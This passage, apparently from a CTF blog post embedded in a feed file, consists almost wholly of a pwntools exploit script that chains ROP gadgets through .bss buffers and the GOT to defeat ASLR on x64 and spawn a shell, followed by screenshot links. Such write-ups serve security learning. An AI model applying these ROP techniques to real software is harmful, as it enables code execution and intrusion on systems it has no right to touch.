class="line">pop_rbp_r14_r15_ret = g(<span class="string">&#x27;pop rbp ; pop r14 ; pop r15 ; ret&#x27;</span>)</span><br><span class="line">pop_rbx_rbp_r12_r13_r14_r15_ret = g(<span class="string">&#x27;pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret&#x27;</span>)</span><br><span class="line">add_ebx_esi_ret = g(<span class="string">&#x27;add ebx, esi ; ret&#x27;</span>)</span><br><span class="line">leave_ret = g(<span class="string">&#x27;leave ; ret&#x27;</span>)</span><br><span class="line">call_at_r12 = g(<span class="string">&#x27;call QWORD PTR [r12+rbx*8]&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x602000</span></span><br><span class="line">buf1 = bss - <span class="number">0x100</span></span><br><span class="line">buf2 = bss - <span class="number">0x200</span></span><br><span class="line">buf3 = bss - <span class="number">0x300</span></span><br><span class="line">buf4 = bss - <span class="number">0x400</span></span><br><span class="line">buf5 = bss - <span class="number">0x500</span></span><br><span class="line">buf6 = bss - <span class="number">0x600</span></span><br><span class="line">buf7 = bss - <span class="number">0x700</span></span><br><span class="line">buf8 = bss - <span class="number">0x800</span></span><br><span class="line"></span><br><span class="line">rop1 = [</span><br><span class="line">  pop_rdi_ret, buf1, gets_plt, <span class="comment"># rop2</span></span><br><span class="line">  pop_rdi_ret, buf2, gets_plt, <span class="comment"># rop4</span></span><br><span class="line">  pop_rdi_ret, buf3, gets_plt, <span class="comment"># rop5</span></span><br><span class="line">  pop_rdi_ret, buf4, gets_plt, <span class="comment"># rop7</span></span><br><span class="line">  pop_rdi_ret, buf5, gets_plt, <span class="comment"># rop9</span></span><br><span class="line">  pop_rdi_ret, buf6, gets_plt, <span class="comment"># rop10</span></span><br><span class="line">  pop_rdi_ret, buf7, gets_plt, <span class="comment"># rop13</span></span><br><span class="line">  pop_rbp_ret, buf1 - <span class="number">8</span>, leave_ret</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">rop2 = [ <span class="comment"># buf1</span></span><br><span class="line">  pop_rdi_ret, gets_got + <span class="number">24</span>, gets_plt, <span class="comment"># rop3</span></span><br><span class="line">  pop_rbp_ret, buf2 - <span class="number">8</span>,</span><br><span class="line">  pop_rsp_r13_r14_r15_ret, gets_got</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">rop3 = [ <span class="comment"># gets_got + 24</span></span><br><span class="line">  leave_ret</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">rop4 = [ <span class="comment"># buf2</span></span><br><span class="line">  libc_csu_init,</span><br><span class="line">  pop_rbp_ret, buf3 - <span class="number">8</span>, leave_ret</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">rop5 = [ <span class="comment"># buf3</span></span><br><span class="line">  pop_rdi_ret, buf2 - <span class="number">24</span>, gets_plt, <span class="comment"># rop6_1</span></span><br><span class="line">  pop_rdi_ret, buf2 + <span class="number">32</span>, gets_plt, <span class="comment"># rop6_2</span></span><br><span class="line">  pop_rbp_ret, buf2 - <span class="number">24</span> - <span class="number">8</span>, leave_ret</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">rop6_1 = [ <span class="comment"># buf2 - 24</span></span><br><span class="line">  pop_rbx_rbp_r12_r13_r14_r15_ret</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">rop6_2 = [ <span class="comment"># buf2 + 32</span></span><br><span class="line">  pop_rsi_r15_ret, offset, <span class="number">8</span>,</span><br><span class="line">  add_ebx_esi_ret,</span><br><span class="line"><span class="comment">#	0xdeadbeef,</span></span><br><span class="line">  libc_csu_init,</span><br><span class="line">  pop_rbp_ret, buf4 - <span class="number">8</span>, leave_ret</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">rop7 = [ <span class="comment"># buf4</span></span><br><span class="line">  pop_rdi_ret, gets_got + <span class="number">28</span>, gets_plt, <span class="comment"># rop8</span></span><br><span class="line">  pop_rbp_ret, buf5 - <span class="number">8</span>,</span><br><span class="line">  pop_rsp_r13_r14_r15_ret, gets_got + <span class="number">4</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">rop8 = [ <span class="comment"># gets_got + 28</span></span><br><span class="line">  leave_ret</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">rop9 = [ <span class="comment"># buf5</span></span><br><span class="line">  libc_csu_init,</span><br><span class="line">  pop_rbp_ret, buf6 - <span class="number">8</span>, leave_ret</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">rop10 = [ <span class="comment"># buf6</span></span><br><span class="line">  pop_rdi_ret, buf5 - <span class="number">24</span>, gets_plt, <span class="comment"># rop11_1</span></span><br><span class="line">  pop_rdi_ret, buf5 + <span class="number">32</span>, gets_plt, <span class="comment"># rop11_2</span></span><br><span class="line">  pop_rbp_ret, buf5 - <span class="number">24</span> - <span class="number">8</span>, leave_ret</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">rop11_1 = [ <span class="comment"># buf5 - 24</span></span><br><span class="line">  pop_rbx_rbp_r12_r13_r14_r15_ret</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">rop11_2 = [ <span class="comment"># buf5 + 32</span></span><br><span class="line">  pop_rdi_ret, buf2 + <span class="number">68</span>, gets_plt, <span class="comment"># rop12</span></span><br><span class="line">  pop_rbp_ret, buf2 + <span class="number">68</span> - <span class="number">8</span>, leave_ret</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">rop12 = [ <span class="comment"># buf2 + 164</span></span><br><span class="line">  libc_csu_init,</span><br><span class="line">  pop_rbp_ret, buf7 - <span class="number">8</span>, leave_ret</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">rop13 = [</span><br><span class="line">  pop_rdi_ret, buf8, gets_plt, <span class="comment"># shell command</span></span><br><span class="line">  pop_rdi_ret, buf8,</span><br><span class="line">  pop_rbx_rbp_r12_r13_r14_r15_ret, <span class="number">0</span>, <span class="number">0</span>, buf2 + <span class="number">24</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">  call_at_r12</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">payload = (</span><br><span class="line">  <span class="string">&#x27;A&#x27;</span> * <span class="number">24</span> +</span><br><span class="line">  <span class="string">&#x27;&#x27;</span>.join(map(p64, rop1)) + <span class="string">&#x27;\n&#x27;</span> +</span><br><span class="line">  <span class="string">&#x27;&#x27;</span>.join(map(p64, rop2)) + <span class="string">&#x27;\n&#x27;</span> +</span><br><span class="line">  <span class="string">&#x27;&#x27;</span>.join(map(p64, rop4)) + <span class="string">&#x27;\n&#x27;</span> +</span><br><span class="line">  <span class="string">&#x27;&#x27;</span>.join(map(p64, rop5)) + <span class="string">&#x27;\n&#x27;</span> +</span><br><span class="line">  <span class="string">&#x27;&#x27;</span>.join(map(p64, rop7)) + <span class="string">&#x27;\n&#x27;</span> +</span><br><span class="line">  <span class="string">&#x27;&#x27;</span>.join(map(p64, rop9)) + <span class="string">&#x27;\n&#x27;</span> +</span><br><span class="line">  <span class="string">&#x27;&#x27;</span>.join(map(p64, rop10)) + <span class="string">&#x27;\n&#x27;</span> +</span><br><span class="line">  <span class="string">&#x27;&#x27;</span>.join(map(p64, rop13)) + <span class="string">&#x27;\n&#x27;</span> +</span><br><span class="line">  <span class="string">&#x27;&#x27;</span>.join(map(p64, rop3))[:<span class="number">-1</span>] + <span class="string">&#x27;\n&#x27;</span> +</span><br><span class="line">  <span class="string">&#x27;&#x27;</span>.join(map(p64, rop6_1))[:<span class="number">-1</span>] + <span class="string">&#x27;\n&#x27;</span> +</span><br><span class="line">  <span class="string">&#x27;&#x27;</span>.join(map(p64, rop6_2)) + <span class="string">&#x27;\n&#x27;</span> +</span><br><span class="line">  <span class="string">&#x27;&#x27;</span>.join(map(p64, rop8)) + <span class="string">&#x27;\n&#x27;</span> +</span><br><span class="line">  <span class="string">&#x27;&#x27;</span>.join(map(p64, rop11_1))[:<span class="number">-1</span>] + <span class="string">&#x27;\n&#x27;</span> +</span><br><span class="line">  <span class="string">&#x27;&#x27;</span>.join(map(p64, rop11_2)) + <span class="string">&#x27;\n&#x27;</span> +</span><br><span class="line">  <span class="string">&#x27;&#x27;</span>.join(map(p64, rop12)) + <span class="string">&#x27;\n&#x27;</span> +</span><br><span class="line">  <span class="string">&#x27;sh\n&#x27;</span></span><br><span class="line">)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+    </div>
+</div>
+
+<p><img src="w5-x64-deaslr-process.png" alt="w5-x64-deaslr-process"></p>
+<p><img src="w5-getv-from-got.png" alt="w5-getv-from-got"></p>
+<p><img src="w5-x64-deaslr-addoffset.png" alt="w5-x64-deaslr-addoffset"></p>
+<p><img src="w5-deaslr-base2rbx.png" alt="w5-deaslr-base2rbx"></p>
 <link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
       <categories>
         <category>CTF</category>
